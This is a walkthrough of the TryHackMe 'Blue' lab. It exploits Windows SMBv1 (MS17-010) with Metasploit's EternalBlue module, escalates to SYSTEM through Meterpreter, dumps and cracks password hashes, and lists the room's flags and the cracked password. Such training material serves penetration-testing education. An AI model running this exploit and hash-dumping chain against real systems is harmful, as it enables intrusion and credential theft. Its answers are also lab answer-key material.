# TryHackMe - Blue: Full Walkthrough

## Overview

**Blue** is a TryHackMe room designed to teach exploiting **Windows SMBv1 (MS17-010)** misconfigurations, privilege escalation, hash dumping, cracking, and flag collection systematically.

---

## \[Task 1] Recon (19/03/2019)

### Description

We start by scanning the machine to identify services and vulnerabilities. Note: The target does not respond to ICMP (ping).

### #1.1 - Scan the machine

Run a full port and service scan:

```bash
sudo nmap -sV -sS -p- <target-ip>
```

**Key open ports:**

* 135 (msrpc)
* 139 (netbios-ssn)
* 445 (microsoft-ds)
* 3389 (RDP)
* High ephemeral ports for msrpc

### #1.2 - How many ports are open under 1000?

**Answer:** 3

### #1.3 - What is this machine vulnerable to?

Run the smb vulnerability script:

```bash
nmap -p445 --script smb-vuln-ms17-010 <target-ip>
```

**Answer:** `ms17-010`

---

## \[Task 2] Gain Access

### Description

We exploit the EternalBlue vulnerability to gain a foothold.

### #2.1 - Start Metasploit

```bash
msfconsole
```

### #2.2 - Find the exploitation code

Search for:

```bash
search ms17-010
```

**Path:** `exploit/windows/smb/ms17_010_eternalblue`

### #2.3 - Show options and set required value

Required option: `RHOSTS`

```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <target-ip>
```

### #2.4 - Run the exploit

```bash
exploit
```

A shell should open, providing us with initial access.

### #2.5 - Confirm shell access

Press **ENTER** if needed, and background the shell with `CTRL+Z`.

---

## \[Task 3] Escalate

### Description

We upgrade our shell to Meterpreter and escalate privileges to SYSTEM.

### #3.1 - Find the post module for upgrading

Search:

```bash
search shell_to_meterpreter
```

**Module:** `post/multi/manage/shell_to_meterpreter`

### #3.2 - Show options and identify required option

Required option: `SESSION`

### #3.3 - Set session

List sessions:

```bash
sessions -l
```

Set:

```bash
set SESSION <session-id>
```

### #3.4 - Run the upgrade

```bash
run
```

### #3.5 - Select Meterpreter session

```bash
sessions -l
sessions <meterpreter-session-id>
```

### #3.6 - Verify SYSTEM access

Run:

```bash
getsystem
shell
whoami
```

**Expected output:** `nt authority\system`

### #3.7 - Migrate to a stable SYSTEM process

List processes:

```bash
ps
```

Identify a SYSTEM process (e.g., `svchost.exe`) and migrate:

```bash
migrate <pid>
```

---

## \[Task 4] Cracking

### Description

We will dump hashes and crack the user password.

### T4.1 - Dump hashes

In Meterpreter:

```bash
hashdump
```

**Non-default user:** `Jon`

### T4.2 - Crack the password

Save the hash to a file and run:

```bash
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt <hashfile>
```

**Password found:** `alqfna22`

---

## \[Task 5] Find Flags

### Description

We locate and capture three flags on the system.

### T5.1 - Flag 1

Navigate to C:\ and read the file:

```bash
type C:\flag1.txt
```

**Flag:** `flag{access_the_machine}`

### T5.2 - Flag 2

Check known locations:

```bash
dir *flag* /s /b
```

Read the file:

```bash
type C:\Windows\System32\config\flag2.txt
```

**Flag:** `flag{sam_database_elevated_access}`

### T5.3 - Flag 3

Navigate to Jon's Documents:

```bash
type C:\Users\Jon\Documents\flag3.txt
```

**Flag:** `flag{admin_documents_can_be_valuable}`

---

## ✅ Summary

By completing **TryHackMe - Blue**, we:

* Performed reconnaissance and identified the SMB vulnerability (MS17-010)
* Gained initial access using Metasploit EternalBlue exploit
* Upgraded to Meterpreter and escalated to SYSTEM
* Dumped and cracked user hashes
* Captured all flags systematically

This room teaches the workflow of enumerating, exploiting, privilege escalation, hash cracking, and post-exploitation practices on a Windows machine vulnerable to SMB misconfigurations, aiding your real-world pentesting and OSCP preparation.
